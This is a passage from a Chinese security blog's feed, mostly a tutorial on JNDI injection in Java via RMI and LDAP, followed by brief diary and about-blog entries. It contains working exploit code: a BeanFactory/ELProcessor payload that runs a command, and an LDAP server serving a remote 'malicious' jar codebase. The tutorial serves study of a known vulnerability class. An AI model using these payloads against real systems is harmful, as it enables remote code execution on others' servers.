&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>所以我们不难看出，任何一个<code>JNDI Context</code>中都有下面几个方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">    将名称绑定到对象。 </span><br><span class="line">list(String name) </span><br><span class="line">    枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">lookup(String name) </span><br><span class="line">    检索命名对象。 </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">    将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class="line">unbind(String name) </span><br><span class="line">    取消绑定命名对象。</span><br></pre></td></tr></table></figure><p>对于<code>DirContext</code>来说，还支持<code>search/createSubcontext/getSchema/getSchemaClassDefinition</code>,这也符合我们之前所说的目录服务。</p><h3 id="key-JNDI动态协议转换"><a href="#key-JNDI动态协议转换" class="headerlink" title=":key:JNDI动态协议转换"></a>:key:JNDI动态协议转换</h3><p>具体原理不用分析，省流量: JNDI会根据提供的URL重新寻找<code>INITIAL_CONTEXT_FACTORY</code>.</p><h3 id="eyes-JNDI中的Reference"><a href="#eyes-JNDI中的Reference" class="headerlink" title=":eyes:JNDI中的Reference"></a>:eyes:JNDI中的Reference</h3><p>目录服务中存在的一种特殊的对象<code>Reference</code>引用。他的构造方法有以下几种：</p><p><img src="https://img.dem0dem0.top/images/image-20220531221602256.png" alt="image-20220531221602256"></p><p>这里面提到了<code>Reference</code>,那么绕不开的就还有<code>RefAddr</code>,这个就相当于是引用的一个指针。他有一个属性<code>addrType</code>表示地址类型。盲猜<code>URLClassLoader</code>,应该也用得上。</p><h3 id="bulb-JNDI-RMI"><a href="#bulb-JNDI-RMI" class="headerlink" title=":bulb:JNDI+RMI"></a>:bulb:JNDI+RMI</h3><p>rmi: 提供了<code>ReferenceWrapper</code>用来将JNDI的<code>Reference</code>包装成一个远程对象。现在想办法把这个引用，怎么变成一个对象？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">who</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am &quot;</span>+ name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFactoryServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;com.dem0.jndi.model.xUser&quot;</span>, <span class="string">&quot;com.dem0.jndi.model.UserFactory&quot;</span>, <span class="string">&quot;http://127.0.0.1:1600&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.rebind(<span class="string">&quot;User&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clent</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFactoryClent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        env.put(<span class="string">&quot;word&quot;</span>,<span class="string">&quot;Dem0&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        <span class="type">User</span> <span class="variable">obj</span> <span class="operator">=</span> (User) ctx.lookup(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        obj.who();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>debug一下流程，直接跳到<code>com.sun.jndi.rmi.registry.RegistryContext#lookup</code></p><p><img src="https://img.dem0dem0.top/images/image-20220531230257636.png" alt="image-20220531230257636"></p><p><img src="https://img.dem0dem0.top/images/image-20220531230409469.png" alt="image-20220531230409469"></p><p>拿到存根对象之后，进入decode</p><p><img src="https://img.dem0dem0.top/images/image-20220531230545741.png" alt="image-20220531230545741"></p><p>可以看到从这里开始，引用变实例了。通过<code>NamingManager.getObjectInstance</code>.</p><p><img src="https://img.dem0dem0.top/images/image-20220531230921678.png" alt="image-20220531230921678"></p><p><img src="https://img.dem0dem0.top/images/image-20220531231327818.png" alt="image-20220531231327818"></p><p>可以看到最后还是调用<code>Reference</code>里面的<code>ObjectFactory#getObjectInstance</code>。但是这里也给了我们一个思路<code>codebase</code>.</p><p><img src="https://img.dem0dem0.top/images/image-20220531231901475.png" alt="image-20220531231901475"></p><p>但是前提还是要先绕过<code>trustURLCodebase</code>.</p><p>这里的一个攻击思路就很明显了:<code>因为RegistryContext会解析ReferenceWrapper对象成Reference，如果Reference存在Factory的话还会进一步decode，从FactroyURL加载Factory并调用其getObjectInstance返回一个对象。本质上就是从远程加载类，直接开一个恶意类提供服务就行了。</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">eference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;whatever&quot;</span>,<span class="string">&quot;EvilClass&quot;</span>,<span class="string">&quot;http://localhost:16000/&quot;</span>);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">registry.rebind(<span class="string">&quot;Foo&quot;</span>, wrapper);</span><br></pre></td></tr></table></figure><p>但是很显然高版本是默认关闭从远程加载的，但是本地的还是可以的。<code>org.apache.naming.factory.BeanFactory</code>+<code>EL</code>表达式还是可以的</p><blockquote><p>参考链接：<a href="https://github.com/apache/tomcat/blob/8e2aa5e45ce13388da62386e3cb1dbfa3b242b4b/java/org/apache/naming/factory/BeanFactory.java">https://github.com/apache/tomcat/blob/8e2aa5e45ce13388da62386e3cb1dbfa3b242b4b/java/org/apache/naming/factory/BeanFactory.java</a></p></blockquote><p>把代码简化一下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载refrence classname对应的类为beanClass,并实例化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">    beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    beanClass = Class.forName(beanClassName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line"><span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line"><span class="comment">//然后找Reference的forceString属性</span></span><br><span class="line"><span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line">Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line">String setterName;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="comment">//将对应Reference的forceString属性值以逗号分隔为param</span></span><br><span class="line"><span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">    param = param.trim();</span><br><span class="line">    <span class="comment">//尝试将param分割成 x=y 的格式 或者xxx</span></span><br><span class="line">    index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    <span class="comment">//case 1: setterName = x param = y</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">        param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//case 2:setterName = setXxxx （Java Bean规范）</span></span><br><span class="line">        setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                     param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                     param.substring(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里将beanClass对应的以setterName为名的参数为String类型的方法放进forced Map中，并以param为键值</span></span><br><span class="line">    forced.put(param,beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取Reference的所有RefAddr，并遍历</span></span><br><span class="line">Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"><span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">    ra = e.nextElement();</span><br><span class="line">    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line">    value = (String)ra.getContent();</span><br><span class="line">    Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//从forcemap里拿 propName（就是当前RefAddr的Type）对应的方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">        <span class="comment">//调用方法参数为value（就是当前RefAddr的Content）</span></span><br><span class="line">        method.invoke(bean, valueArray);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//遍历pda就是bean的属性描述</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;pda.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pda[i].getName().equals(propName)) &#123;</span><br><span class="line">            Class&lt;?&gt; propType = pda[i].getPropertyType();</span><br><span class="line">            <span class="comment">//只允许调用方法参数为几个基本类String/Double/Character/...且只能有一个参数的方法</span></span><br><span class="line">            <span class="keyword">if</span> (propType.equals(String.class)) &#123;</span><br><span class="line">                valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Character.class)</span><br><span class="line">                       || propType.equals(<span class="type">char</span>.class)) &#123;</span><br><span class="line">                valueArray[<span class="number">0</span>] =</span><br><span class="line">                    Character.valueOf(value.charAt(<span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//拿到对应写属性的方法，调用其方法写属性</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setProp</span> <span class="operator">=</span> pda[i].getWriteMethod();</span><br><span class="line">            setProp.invoke(bean, valueArray);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回写完属性生成的bean</span></span><br><span class="line"><span class="keyword">return</span> bean;</span><br></pre></td></tr></table></figure><p>大概总结一下流程，会新建<code>classname对应的类为beanClass</code>,然后根据<code>forceString</code>属性，的值来切分（“a&#x3D;b”）,就会调用B方法，并且将以a为主键的字符串传进去。最经典的exp也就不难解释了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,&#x27;calc.exe&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br></pre></td></tr></table></figure><p>浅蓝师傅： <a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a> 挖出了新的利用链。超爱eki的总结:</p><ul><li>恶意类有public修饰的无参构造方法（getConstructor().newInstance()所限）</li><li>恶意类有只有一个String.class类型参数的危险方法（paramTypes所限）</li><li>恶意类有只有一个基本类型参数的满足bean规范的（setXX）危险方法（paramTypes所限）</li></ul><h2 id="0x03-LDAP"><a href="#0x03-LDAP" class="headerlink" title="0x03 LDAP"></a>0x03 LDAP</h2><p>其实更多的就是对于RMI和上面这两种了，LDAP感觉我碰到挺少的。其实也就是常见的两种存储方式</p><ul><li><p>Reference</p><blockquote><p>高版本一样没有了</p></blockquote></li><li><p>序列化</p><blockquote><p>本地存在反序列化链子就可以。</p></blockquote></li></ul><p>LDAPserver:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.jndi.injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPReferenceServerTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP服务端口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SERVER_PORT</span> <span class="operator">=</span> <span class="number">3890</span>;</span><br><span class="line"><span class="comment">// 设置LDAP绑定的服务地址，外网测试换成0.0.0.0</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BIND_HOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">// 设置一个实体名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_ENTRY_NAME</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="comment">// 获取LDAP服务地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">LDAP_URL</span> <span class="operator">=</span> <span class="string">&quot;ldap://&quot;</span> + BIND_HOST + <span class="string">&quot;:&quot;</span> + SERVER_PORT + <span class="string">&quot;/&quot;</span> + LDAP_ENTRY_NAME;</span><br><span class="line"><span class="comment">// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REMOTE_REFERENCE_JAR</span> <span class="operator">=</span> <span class="string">&quot;https://anbai.io/tools/jndi-test.jar&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP基底DN</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=javasec,dc=org&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 创建LDAP配置对象</span></span><br><span class="line"><span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP监听配置信息</span></span><br><span class="line">config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line"><span class="string">&quot;listen&quot;</span>, InetAddress.getByName(BIND_HOST), SERVER_PORT,</span><br><span class="line">ServerSocketFactory.getDefault(), SocketFactory.getDefault(),</span><br><span class="line">(SSLSocketFactory) SSLSocketFactory.getDefault())</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加自定义的LDAP操作拦截器</span></span><br><span class="line">config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建LDAP服务对象</span></span><br><span class="line"><span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务</span></span><br><span class="line">ds.startListening();</span><br><span class="line">System.out.println(<span class="string">&quot;LDAP服务启动成功,服务地址：&quot;</span> + LDAP_URL);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">base</span>  <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line"><span class="type">Entry</span>  <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 设置对象的工厂类名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.anbai.sec.jndi.injection.ReferenceObjectFactory&quot;</span>;</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, className);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, className);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置远程的恶意引用对象的jar地址</span></span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, REMOTE_REFERENCE_JAR);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP objectClass</span></span><br><span class="line">entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line"></span><br><span class="line">result.sendSearchEntry(entry);</span><br><span class="line">result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">e1.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">// 获取RMI绑定的恶意ReferenceWrapper对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(LDAP_URL);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure><p><code>ds.add(&quot;en=avv&quot;,object)</code>,可以绑定对象了就。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th>攻击类型</th><th>适用jdk版本</th><th>需要条件</th></tr></thead><tbody><tr><td>JNDI+RMI (Reference Remote Factory)</td><td>&lt;7u21、6u45</td><td>无</td></tr><tr><td>JNDI+RMI (Reference Local Factory)</td><td>任意</td><td>调用端存在利用链</td></tr><tr><td>JNDI+LDAP (Reference Remote Codebase)</td><td>&lt;8u191</td><td>无</td></tr><tr><td>JNDI+LDAP (Serialize Object)</td><td>任意</td><td>调用端存在反序列化链</td></tr></tbody></table></li></ul><h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><blockquote><p>1.高版本bypass<a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></p><p>2.eki-rmi:<a href="https://tttang.com/archive/1430/">https://tttang.com/archive/1430/</a></p><p>3.eki-ldap: <a href="https://tttang.com/archive/1441/">https://tttang.com/archive/1441/</a></p><p>4.<a href="https://www.anquanke.com/post/id/197829">https://www.anquanke.com/post/id/197829</a></p><p>5.绕过：<a href="https://www.cnblogs.com/zpchcbd/p/14941783.html">https://www.cnblogs.com/zpchcbd/p/14941783.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dem0のdiary</title>
      <link href="/2022/05/30/Dem0%E3%81%AEdiary/"/>
      <url>/2022/05/30/Dem0%E3%81%AEdiary/</url>
      
        <content type="html"><![CDATA[<h1 id="Dem0のdiary"><a href="#Dem0のdiary" class="headerlink" title="Dem0のdiary"></a>Dem0のdiary</h1><blockquote><p>最近太闲了，啥也在看，啥也没学会，开个blog激励一下自己。(致敬sakura!)争取365天拿下科恩offer！</p></blockquote><h2 id="2022-x2F-05-x2F-31"><a href="#2022-x2F-05-x2F-31" class="headerlink" title="2022&#x2F;05&#x2F;31"></a>2022&#x2F;05&#x2F;31</h2><ul><li><p>学习</p><p>啥也没学.png，预计到6.2号之前估计都不会更新这个模块。(考试咕咕)</p></li><li><p>杂事</p><p>开启了blog,希望自己能够坚持下去，也坚持学下去。</p></li></ul><h2 id="2022-x2F-06-x2F-06"><a href="#2022-x2F-06-x2F-06" class="headerlink" title="2022&#x2F;06&#x2F;06"></a>2022&#x2F;06&#x2F;06</h2><ul><li><p>学习</p><p>这周末主要学习了洛谷8道算法(高精度和模拟)+java的SSTI注入，发现了一个神仙paper，后面会仔细研究一下，因为考虑到还有几个java的引擎还没有学习到，所以我打算先学完(主要是一边看一边在出题)</p></li><li><p>杂事</p><p>这个端午打LOL和几位大哥一起恰了饭(dengfeng猛carry！)</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About new Blog</title>
      <link href="/2022/05/30/aboutAgo/"/>
      <url>/2022/05/30/aboutAgo/</url>
      
        <content type="html"><![CDATA[<h1 id="About-new-blog"><a href="#About-new-blog" class="headerlink" title="About new blog"></a>About new blog</h1><h2 id="Q-为什么新建博客？"><a href="#Q-为什么新建博客？" class="headerlink" title="Q: 为什么新建博客？"></a>Q: 为什么新建博客？</h2><blockquote><p> 小白文写着确实没什么收获，后续自己在看到相同的问题的时候也不好回想。(最近太闲了，</p></blockquote><h2 id="Q-发水文"><a href="#Q-发水文" class="headerlink" title="Q: 发水文?"></a>Q: 发水文?</h2><blockquote><p> 尽量保证博客中发的都是高质量爽文，保证质，但是不保证量，顶个flag(一周能复现一篇高质量！)</p></blockquote><h2 id="Q-写什么？"><a href="#Q-写什么？" class="headerlink" title="Q: 写什么？"></a>Q: 写什么？</h2><blockquote><p>心情好，想写什么写什么。</p></blockquote><h2 id="Q：之前没有写过文章吗？之前的好文呢？"><a href="#Q：之前没有写过文章吗？之前的好文呢？" class="headerlink" title="Q：之前没有写过文章吗？之前的好文呢？"></a>Q：之前没有写过文章吗？之前的好文呢？</h2><blockquote><p>CSDN:<a href="https://blog.csdn.net/anwen12">https://blog.csdn.net/anwen12</a></p><p>github: <a href="https://github.com/3em0/java_3em0">https://github.com/3em0/java_3em0</a></p><p>强烈推荐github，小白入门系列。</p></blockquote><h2 id="Q-友链"><a href="#Q-友链" class="headerlink" title="Q: 友链"></a>Q: 友链</h2><blockquote><p> link_list:<br>    - name: in1t<br>      link: <a href="https://in1t.top/">https://in1t.top</a><br>      avatar: <a href="https://in1t.top/img/avatar.jpg">https://in1t.top/img/avatar.jpg</a><br>      descr: 一只对二进制感兴趣的菜鸡</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF-java部分</title>
      <link href="/2022/05/30/mrctf2022java%E9%A2%98%E8%A7%A3/"/>
